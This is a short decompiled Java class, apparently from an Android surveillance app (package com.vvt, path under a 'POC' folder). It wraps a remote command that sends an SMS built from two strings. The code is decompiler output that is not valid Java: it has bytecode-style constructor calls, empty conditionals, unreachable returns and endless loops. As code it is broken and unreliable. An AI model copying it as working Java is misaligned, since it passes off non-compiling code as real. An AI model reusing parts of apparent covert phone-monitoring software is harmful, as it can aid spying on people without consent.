package com.vvt.ae;

import com.fx.psysd.ref.command.RemoteSendSms;
import com.fx.psysd.ref.command.SendSmsMetadata;
import java.io.IOException;

public class a
  implements e
{
  private static final boolean a = com.vvt.ak.a.a;
  private static final boolean b = com.vvt.ak.a.e;
  private String c;
  private String d;
  
  public a(String paramString1, String paramString2)
  {
    this.c = paramString1;
    this.d = paramString2;
  }
  
  public boolean a()
  {
    boolean bool1 = a;
    if (bool1) {}
    Object localObject1 = new com/fx/psysd/ref/command/SendSmsMetadata;
    String str = this.c;
    Object localObject3 = this.d;
    ((SendSmsMetadata)localObject1).<init>(str, (String)localObject3);
    boolean bool2 = false;
    str = null;
    localObject3 = new com/fx/psysd/ref/command/RemoteSendSms;
    ((RemoteSendSms)localObject3).<init>((SendSmsMetadata)localObject1);
    for (;;)
    {
      try
      {
        localObject1 = ((RemoteSendSms)localObject3).execute();
        localObject1 = (Boolean)localObject1;
        bool1 = ((Boolean)localObject1).booleanValue();
        Object localObject2;
        bool2 = b;
      }
      catch (IOException localIOException1)
      {
        try
        {
          bool2 = a;
          if (bool2) {}
          return bool1;
        }
        catch (IOException localIOException2)
        {
          for (;;) {}
        }
        localIOException1 = localIOException1;
        bool1 = false;
        localObject2 = null;
      }
      if (!bool2) {}
    }
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/ae/a.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */